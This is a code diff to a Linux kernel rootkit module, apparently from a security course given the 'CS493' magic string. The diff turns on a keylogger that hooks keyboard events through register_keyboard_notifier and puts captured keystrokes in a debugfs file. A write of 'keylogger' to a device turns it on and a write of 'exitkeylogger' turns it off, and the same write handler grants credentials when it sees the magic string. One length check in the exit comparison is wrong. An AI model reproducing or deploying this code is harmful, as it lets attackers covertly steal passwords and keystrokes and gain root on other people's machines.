@@ -24,7 +24,7 @@
 #include <linux/keyboard.h>
 #include <linux/input.h>
 
-//#include "logger.c"
+#include "logger.c"
 //#include <include/fcntl.h>
 
 
@@ -52,6 +52,7 @@ static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
 static int dev_release(struct inode *inodep, struct file *filep);
 static int run_keylogger(void);
+static int exit_keylogger(void);
 
 
 // *********************************************************************
@@ -75,41 +76,6 @@ static struct class*  rootcharClass		= NULL;
 static struct device* rootcharDevice	= NULL;
 static int    				numberOpens 		= 0;
 
-static const char *keymap[][2] = {
-	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
-	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
-	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
-	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
-	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
-	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
-	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
-	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
-	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
-	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
-	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
-	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
-	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
-	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
-	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
-	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
-	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
-	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
-	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
-	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
-	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
-	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
-	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
-	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
-	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
-	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
-	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
-	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
-	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
-	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
-	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
-	{"_PAUSE_", "_PAUSE_"},                                         // 119
-};
 
 static struct file_operations fops =
 {
@@ -210,6 +176,7 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	printk ("Device write\n");
 	char   magic[] = "CS493";
 	char   logger[] = "keylogger";
+	char exitlogger[] = "exitkeylogger";
 	struct cred *new_cred;
 	if (memcmp(buf, magic, (int)sizeof(magic)-1) == 0) 	// compares data and magic
 	{
@@ -229,7 +196,12 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
 	{
 		printk("Keylogger activated\n");
-		//run_keylogger();
+		run_keylogger();
+	}
+	else if(memcmp(buf, exitlogger, (int)sizeof(logger)-1) == 0)
+	{
+		printk("Keylogger deactivated\n");
+		exit_keylogger();
 	}
 	return len;
 }
@@ -237,7 +209,34 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 static int run_keylogger(void)
 {
 
+	if (codes < 0 || codes > 2)
+		return -EINVAL;
+
+	subdir = debugfs_create_dir("lkmr", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+		return -ENOENT;
+
+	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
+	if (!file) {
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
+	}
+
+	/*
+	 * Add to the list of console keyboard event
+	 * notifiers so the callback keysniffer_cb is
+	 * called when an event occurs.
+	 */
+	register_keyboard_notifier(&keysniffer_blk);
 	return 0;
+}
+
+static int exit_keylogger(void)
+{
+	unregister_keyboard_notifier(&keysniffer_blk);
+	debugfs_remove_recursive(subdir);
 }
 
 
